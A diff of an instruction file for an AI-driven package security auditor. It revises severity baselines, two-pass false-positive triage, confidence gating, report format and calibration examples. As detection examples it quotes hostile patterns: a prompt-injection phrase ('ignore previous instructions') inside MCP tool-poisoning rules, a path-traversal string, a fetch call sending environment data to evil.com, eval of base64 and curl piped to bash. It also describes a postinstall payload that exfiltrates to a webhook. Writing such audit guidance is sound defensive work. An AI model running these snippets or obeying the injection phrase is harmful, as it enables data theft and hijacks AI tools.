@@ -29,7 +29,7 @@ Findings in hooks/scripts/MCP servers are more dangerous than in docs.
 
 ---
 
-## Step 2: Identify Package Purpose
+## Step 2: Identify Package Purpose & Severity Baseline
 
 Determine core purpose from README/docs (needed for Step 4 by-design classification):
 - **Code execution** (agent/REPL): `exec()`, `eval()`, `compile()`, dynamic imports
@@ -38,6 +38,22 @@ Determine core purpose from README/docs (needed for Step 4 by-design classificat
 - **Build tool**: FS writes, `child_process`, `subprocess`, shell commands
 - **API client**: Outbound HTTP, credential handling
 - **Package manager**: `curl`, `wget`, install commands, file downloads
+
+### Package-Type Severity Baselines
+
+The package type determines what is **expected behavior** vs. what is **suspicious**. Patterns that are core to a package's purpose are NOT findings:
+
+| Package Type | Expected (NOT findings) | Suspicious (investigate) |
+|---|---|---|
+| **API client** | Outbound HTTP, credential params, JSON parsing | Hardcoded non-API URLs, credential logging |
+| **MCP server** | Tool definitions, stdio transport, env config | Unsanitized path access, hidden tool instructions |
+| **CLI tool** | `child_process`, env reads, file I/O | Unvalidated user input to shell, priv escalation |
+| **Build tool** | FS writes, subprocess, temp dirs | Writing outside project dir, network during build |
+| **Docs/Guide** | Install instructions, config examples | Executable code disguised as docs |
+| **ML/AI** | `pickle`/`torch.load` on local models, GPU access | Remote model download + exec, data exfiltration |
+| **Library/SDK** | Public API functions, standard patterns | Telemetry without disclosure, postinstall scripts |
+
+**Rule: If a pattern is in the "Expected" column for the identified package type, it CANNOT be MEDIUM or higher. It is either NOT a finding or at most LOW/by_design.**
 
 ---
 
@@ -94,7 +110,7 @@ Check every file against each category below. For each issue found, note the **f
 - **`MCP_POISON_001`** (Critical): Tool desc/schema with LLM instructions ("run `curl...`", "ignore previous instructions")
 - **`MCP_INJECT_001`** (Critical): Prompt injection in tool/param descriptions, error messages (instruction overrides, role-play triggers)
 - **`MCP_TRAVERSAL_001`** (High): File tools don't sanitize paths (allows `../../../etc/passwd`, absolute paths)
-- **`MCP_SUPPLY_001`** (High): `npx -y <pkg>` without version pinning (supply-chain attack risk)
+- **`MCP_SUPPLY_001`** (Medium): `npx -y <pkg>` without version pinning in **code/config** (supply-chain risk). If only in README/docs → LOW or exclude.
 - **`MCP_PERM_001`** (Medium): Wildcard/broad permissions (`Bash(*)`, unrestricted FS/network, `defaultMode: dontAsk`)
 
 **MCP Audit Checklist:**
@@ -132,6 +148,57 @@ Look for **multi-file attack patterns** (benign alone, dangerous combined):
 
 ---
 
+## Step 3.7: Exploitability Assessment (MANDATORY for every candidate finding)
+
+Before classifying any finding, you MUST assess its real-world exploitability using these four dimensions (inspired by CVSS v4.0):
+
+For each candidate finding, answer these questions explicitly:
+
+### 1. Attack Vector — How does the attacker reach this code?
+- **Network** (remotely exploitable via HTTP/API/WebSocket) → higher severity
+- **Adjacent** (requires local network/shared resource) → medium
+- **Local** (requires local access or social engineering) → lower severity
+- **None** (requires physical access or code modification) → likely NOT a finding
+
+### 2. Attack Complexity — What conditions must be true?
+- **Low**: No special conditions. Works out of the box.
+- **High**: Requires specific config, race condition, non-default setup, or chained exploits.
+- If complexity is High, cap at MEDIUM unless impact is catastrophic.
+
+### 3. Privileges & Interaction Required
+- Does the attacker need authenticated access? Admin privileges? User interaction?
+- The more prerequisites, the lower the realistic severity.
+
+### 4. Impact — What can the attacker actually achieve?
+- **Confidentiality**: Can they read secrets/data they shouldn't?
+- **Integrity**: Can they modify code/data/config?
+- **Availability**: Can they crash or disrupt the service?
+
+### Severity Gate Rules (enforced):
+- **CRITICAL** requires: Network attack vector + Low complexity + High impact on C/I/A + No special privileges needed
+- **HIGH** requires: Realistic attack scenario where attacker gains meaningful access (not theoretical)
+- **MEDIUM**: Pattern is concerning but requires specific conditions or has limited impact
+- **LOW**: Best-practice violation, theoretical risk, informational
+
+**If you cannot describe a concrete 2-sentence attack scenario, the finding is NOT Critical or High.**
+
+Example assessment:
+```
+Finding: exec() used with user-provided input from HTTP body
+Attack Vector: Network (HTTP endpoint)
+Complexity: Low (send POST request)
+Privileges: None (public endpoint)
+Impact: Full code execution (C+I+A)
+→ CRITICAL ✓ (concrete scenario: attacker POSTs malicious code to endpoint)
+
+Finding: shell=True used with hardcoded "git status" string
+Attack Vector: None (no external input reaches this code)
+Complexity: N/A
+→ NOT A FINDING (no attack vector exists)
+```
+
+---
+
 ## Step 4: Classify Each Finding — Real Vulnerability vs. By-Design
 
 For every finding from Step 3, determine whether it is a **real vulnerability** or a **by-design pattern**.
@@ -162,21 +229,115 @@ If **any** fails → **real vulnerability** (`by_design: false`).
 
 ---
 
-## Step 5: Distinguish Real Issues from False Positives
+## Step 5: Two-Stage Triage — Filter False Positives, Then Verify
 
-After classifying real vs. by-design, filter out **false positives** — patterns that look dangerous but are not.
+This step uses a **two-pass approach** (industry standard for AI SAST tools, achieving up to 95% false positive reduction):
 
-**Real finding:** `exec("rm " + input)`, `fetch("evil.com", {body: env})`, `eval(atob("..."))`, `curl $URL | bash`, zero-width chars in instructions
+### Pass 1: Pattern-Based Exclusion
 
-**NOT a finding (exclude):** `exec` method on query builder (`knex.exec()`), `eval` in comments/docs, `rm -rf ./build`, hardcoded safe commands, test files with deliberate vulns, env reads used locally, negation contexts ("never use eval"), install docs (`sudo apt`), DB query execution
+Immediately exclude these — they are NEVER findings regardless of context:
 
-**By-design finding** (`by_design: true`, `score_impact: 0`): `exec()` in agent code-runner, `pickle.loads()` in ML model loader, dynamic `import()` in plugin system, outbound HTTP in API client, `subprocess` in build tool. Report for transparency, no score penalty.
+**Not-a-finding patterns (exclude completely — do NOT report):**
+- `exec` method on query builder (`knex.exec()`), `eval` in comments/docs
+- `rm -rf ./build` or `rm -rf $TMPDIR` (cleanup of own temp/build dirs)
+- Hardcoded safe commands, test files with deliberate vulns
+- Env reads used locally (reading `process.env.API_KEY` to configure own service)
+- Negation contexts ("never use eval"), install docs (`sudo apt`)
+- DB query execution, ORM `.execute()` calls
+- **Writing secrets/keys to `.env` files** — standard config practice. `.env` files ARE the correct place for secrets.
+- **`shell=True` with hardcoded safe strings** (e.g., `which npx`, `git status`). Only flag if user-controlled input is passed.
+- **`curl | bash` in README/install docs** — common pattern. At most LOW, NEVER CRITICAL/HIGH.
+- **Telemetry/analytics with opt-out** — at most LOW/MEDIUM if undisclosed.
+- **`npx -y` in documentation examples** — informational only. Docs ≠ code vulnerability.
+- **Returning error messages to clients** — at most LOW unless credentials/stack traces leaked.
+- **JSON parsing without size limits** — NOT a finding unless in HTTP endpoint with untrusted input.
+- **Missing file permission hardening** — at most LOW informational, NEVER MEDIUM+.
+- **Demo/example credentials in docs/templates** — NOT a finding if clearly marked as demo.
+- **Standard HTTP client usage** in an API client package — that's its purpose.
+- **Logging warnings/errors to console** — NOT a finding.
+- **Using `json.loads()` / `JSON.parse()`** — standard deserialization, NOT unsafe deserialization.
+- **Optional dependencies or dev dependencies** — NOT supply chain risk.
+- **TypeScript/ESLint/formatter config** — NOT security-relevant.
+- **README instructions to set environment variables** — NOT credential exposure.
+- **Password/key as function parameters** — the API must accept credentials to function. NOT a finding.
+- **Connecting to databases/APIs** — that's what backend packages do.
+
+### Pass 2: Exploitability Verification (MANDATORY for every remaining finding)
+
+For each candidate finding that survived Pass 1, answer this verification checklist:
+
+| Question | If NO → |
+|---|---|
+| Can I describe a specific, realistic attack scenario in 2 sentences? | **Drop to LOW or exclude** |
+| Does external/untrusted input actually reach this code path? | **Exclude** (no attack vector) |
+| Is this pattern abnormal for this package type? (Check Step 2 baseline) | **Exclude or mark by_design** |
+| Would a security team at Google/Meta/Anthropic report this to the maintainer? | **Drop severity or exclude** |
+| Does this finding have concrete evidence (file, line, code snippet)? | **Exclude** (speculation) |
+
+**Only findings that pass ALL 5 checks proceed to the report.**
+
+### Confidence Gating (ENFORCED)
+
+Every finding MUST have a confidence level. Confidence gates severity:
+
+| Confidence | Criteria | Max Severity Allowed |
+|---|---|---|
+| **high** | Direct code evidence, clear attack vector, unambiguous exploitation | CRITICAL |
+| **medium** | Pattern matches but context is ambiguous or conditions unclear | HIGH |
+| **low** | Theoretical risk, standard practice might apply, no clear exploit | MEDIUM |
+
+**CRITICAL findings REQUIRE high confidence. No exceptions.** A CRITICAL finding with medium or low confidence is a misclassification — demote it.
+
+### Finding Count Cap
+
+**Maximum 8 real findings per audit.** If you have more than 8 candidates after triage:
+1. Keep the highest severity + highest confidence findings
+2. Merge related findings (e.g., 5 SQL injections in same file = 1 finding with note "5 instances")
+3. Drop LOW-confidence findings first
+
+Why: Reports with 15+ findings signal noise, not thoroughness. A focused report with 3-5 high-confidence findings is more valuable than 20 speculative ones.
+
+### Severity Definitions (Strict)
+
+**CRITICAL** (reserved for actual malware/backdoors):
+- Active malware with exfiltration
+- Confirmed backdoors (reverse shells, C2 communication)
+- Credential theft with verified exfiltration endpoint
+- Destructive operations on user data without consent
+- Tool poisoning with concrete injection payloads
+
+**HIGH** (directly exploitable with realistic attack scenario):
+- Command/SQL injection where untrusted input reaches execution
+- RCE via deserialization of untrusted data
+- Authentication bypass allowing unauthorized access
+- Path traversal exposing sensitive files to network attacker
+
+**MEDIUM** (conditional risk, requires specific circumstances):
+- Hardcoded secrets in code (not in .env/config templates)
+- Insecure protocols for sensitive data
+- Overly broad permissions beyond stated purpose
+- Weak cryptography for security-critical operations
+
+**LOW** (best-practice violations, informational):
+- Missing input validation without clear exploitation
+- Verbose error messages
+- Unpinned dependencies without known CVEs
+- Missing security headers
+
+**By-design** (`by_design: true`, `score_impact: 0`): `exec()` in agent code-runner, `pickle.loads()` in ML model loader, dynamic `import()` in plugin system, outbound HTTP in API client, `subprocess` in build tool. Report for transparency, no score penalty.
 
 ---
 
 ## Step 6: Output Your Findings
 
 **CRITICAL: ALL text fields (`title`, `description`, `remediation`) MUST be written in ENGLISH. This is a strict requirement for the AgentAudit registry.**
+
+**Finding title format rules:**
+- Title MUST describe the specific vulnerability: `"Unsanitized user input in SQL query"` ✅
+- Title MUST NOT be a section header: `"Priority Issues"` ❌, `"Risk Issues:"` ❌
+- Title MUST NOT contain markdown: `"**Remote code execution**"` ❌ → `"Remote code execution"` ✅
+- Title MUST NOT end with `)` or `**` (broken markdown artifacts)
+- Title should be 5-15 words, factual, specific to the finding
 
 **source_url rules:** The `source_url` field MUST point to a **source code repository** — never a product website, API endpoint, or marketing page.
 - **Best:** GitHub/GitLab repository URL (e.g., `https://github.com/owner/repo`)
@@ -221,7 +382,7 @@ Produce a JSON report in this format:
       "confidence": "medium",
       "remediation": "Replace with SHA-256",
       "by_design": false,
-      "score_impact": -8
+      "score_impact": -5
     }
   ]
 }
@@ -278,11 +439,11 @@ Add **`file_hash`** (SHA-256 of individual file: `sha256sum file.js | cut -d' ' 
 
 ### Field defaults
 - `by_design`: default `false` (set `true` only when all 4 Step 4 criteria met)
-- `score_impact`: By-design = `0`. Otherwise: critical `-25`, high `-15`, medium `-8`, low `-3`
-- High-risk components (hooks, MCP, shell): escalate severity one level (low→medium, medium→high)
+- `score_impact`: By-design = `0`. Otherwise: critical `-25`, high `-15`, medium `-5`, low `-1`
+- High-risk components (hooks, MCP, shell): escalate severity one level ONLY if the finding already passes the exploitability assessment from Step 3.7. Do NOT escalate pattern-only matches without confirmed attack vectors.
 
 ### Risk Score Calculation
-`risk_score = Σ(score_impact WHERE by_design = false)` = sum of absolute penalties. Example: 1 medium (-8) + 2 by-design high (0) → `risk_score: 8`. By-design findings excluded from score.
+`risk_score = Σ(score_impact WHERE by_design = false)` = sum of absolute penalties. Example: 1 medium (-5) + 2 by-design high (0) → `risk_score: 5`. By-design findings excluded from score.
 
 ### Pattern ID Prefixes
 
@@ -304,3 +465,36 @@ Full pattern reference: `references/DETECTION-PATTERNS.md`
 Save JSON and upload: `bash scripts/upload.sh report.json`
 
 If no findings: still submit with empty `findings` array and `result: "safe"` — clean scans are valuable too.
+
+---
+
+## Appendix A: Calibration Examples (Ground Truth)
+
+These examples are from real audits. Use them to calibrate your severity assignments.
+
+### Correct CRITICAL findings (true positives):
+1. **`Johnza06--advance-fraud-analyst`**: Multi-stage malware — `postinstall` script downloads and executes remote payload, exfiltrates env vars to hardcoded webhook. Risk: 90. ✅ Correct: confirmed malware with exfiltration endpoint.
+2. **`mukul975--mysql-mcp-server`**: Password injection via unsanitized user input directly concatenated into SQL GRANT/REVOKE statements (mysql_server.py:5233). ✅ Correct: user input → SQL execution, no sanitization.
+3. **`osint-graph-analyzer`**: Cypher injection — user input directly interpolated into Neo4j queries (scripts/osint-graph.py:57). ✅ Correct: classic injection, network-reachable.
+
+### Incorrect CRITICAL/HIGH findings (false positives from real audits — DO NOT repeat):
+1. ❌ **`video-transcript`**: "Shell RC File Modification for Persistence" rated CRITICAL. Reality: The script adds a PATH entry to `.bashrc` — this is standard installation practice, not malware persistence. Should be LOW at most.
+2. ❌ **`pair-trade-screener`**: HIGH finding for "quality educational tool". Reality: A clean Python educational package with zero security issues. Finding was hallucinated.
+3. ❌ **`clawspaces`**: HIGH for "priority tasks". Reality: Title is not even a finding description — it's a section header from the report that was misclassified as a finding.
+4. ❌ **`agentguard`**: HIGH for "Risk Issues:". Reality: Another section header treated as a finding title.
+5. ❌ **`mcp-server-puppeteer`**: MEDIUM for `npx -y` in documentation examples. Reality: Documentation showing how to use a package is not a vulnerability in the package itself.
+6. ❌ **`mcp`** (Anthropic SDK): LOW for `shell=True` with hardcoded safe string. Reality: Calling `which npx` with shell=True is standard and safe — no user input involved.
+
+### Patterns that indicate over-reporting (self-check):
+- Finding titles that are section headers ("Priority Issues", "Risk Issues:", "Best Practice)")
+- More than 5 findings for a simple <500 LOC package
+- CRITICAL/HIGH for documentation content (README, examples, tutorials)
+- Findings about patterns that are the package's stated purpose
+- risk_score > 50 for a package with no confirmed exploit path
+
+### Ideal audit distribution (benchmark from industry SAST tools):
+- ~60-70% of packages should be `safe` (0-25 risk score)
+- ~20-25% should be `caution` (26-50)
+- ~5-10% should be `unsafe` (51-100) — only confirmed malware or severe vulnerabilities
+- CRITICAL findings should appear in <5% of audits
+- Average findings per audit: 1-3 (not 5-10)
